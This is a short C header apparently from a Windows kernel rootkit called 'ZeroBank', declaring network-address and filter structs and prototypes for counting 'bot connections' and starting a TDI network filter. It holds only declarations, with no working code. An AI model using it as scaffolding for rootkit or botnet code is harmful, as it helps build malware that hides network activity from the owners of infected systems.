#pragma once

typedef struct _ROOTKIT_NETWORK_ADDRESS
{
	UCHAR ip[4];
	UCHAR Port[2];

}ROOTKIT_NETWORK_ADDRESS, *PROOTKIT_NETWORK_ADDRESS;

typedef struct _ZEROBANK_FILTER_DATA
{
	LIST_ENTRY Entry;
	ULONG Type;
}ZEROBANK_FILTER_DATA, *PZEROBANK_FILTER_DATA;

typedef struct _ZEROBANK_FILTER_HEAD
{
	LIST_ENTRY Entry;
	ULONG NumberOfConnections;
}ZEROBANK_FILTER_HEAD, *PZEROBANK_FILTER_HEAD;


PZEROBANK_FILTER_HEAD rk_get_number_of_bot_connections(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);
ULONG rk_copy_connections_to_buffer(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp, IN PZEROBANK_FILTER_DATA pData);

NTSTATUS g_rk_connect_filter(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);
NTSTATUS g_rk_connect_filter_thread(IN PVOID Context);
NTSTATUS g_rk_start_TDI_filter(IN PZEROBANK_TDI_FILTER tdi);